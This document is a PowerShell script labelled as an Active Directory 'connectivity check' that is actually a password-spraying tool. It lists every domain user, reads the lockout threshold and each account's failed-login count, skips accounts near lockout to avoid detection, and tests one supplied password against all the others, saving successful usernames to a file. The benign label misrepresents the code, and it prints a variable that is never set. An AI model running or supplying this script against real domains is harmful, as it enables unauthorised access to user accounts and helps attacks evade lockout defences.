# Author: ysN
## This Script helps to perform a connectivity check against the Active Directory LDAP service.

Function Invoke-ADConnection {
    param(
        $username,
        $password)   
    return (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
}

# Password Policy Definition
$secpol = net accounts
$lockoutThreshold = ($secpol -match '^Lockout threshold:\s*(\d+)')[0] -replace '^Lockout threshold:\s*'
$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
$ldapPath = "LDAP://$Domain"
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
$directorySearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$directorySearcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$directorySearcher.PropertiesToLoad.AddRange(@("badPwdCount", "sAMAccountName")) 
$users = $directorySearcher.FindAll()
$total = $users.Count

Write-Host -ForegroundColor Cyan "Collecting users..."
Write-Host -ForegroundColor Yellow "[+] Total Domain Users: $total"
Write-Host "`n"
Write-Host -NoNewline -ForegroundColor Yellow "Enter A Password: "
$password = Read-Host
$Counter = 0 
$users | ForEach-Object {   
    $userProperties = $_.Properties
    $UserName = $userProperties["sAMAccountName"][0]
    $BadPwdCount = $userProperties["badPwdCount"][0]
    if (($LockoutThreshold -eq 0) -or (($LockoutThreshold - $BadPwdCount) -gt 2)) {
        $auth = Invoke-ADConnection -username $UserName -password $password
        if($auth -eq "True"){
            Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
            $UserName | Out-File UsersFound.txt -Append
        }
        Write-Progress -Activity "In Progress:" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
        $Counter++
    } else {
        Write-Host -ForegroundColor Red "[-] Skipped: $UserName have less than 2 loggon attempts!"
    }
}
Write-Host "`n"
Write-Host -ForegroundColor Yellow "[+] Users Found: $users_found_num"
Write-Host -ForegroundColor Green "Saving Results To: 'UsersFound.txt'" 

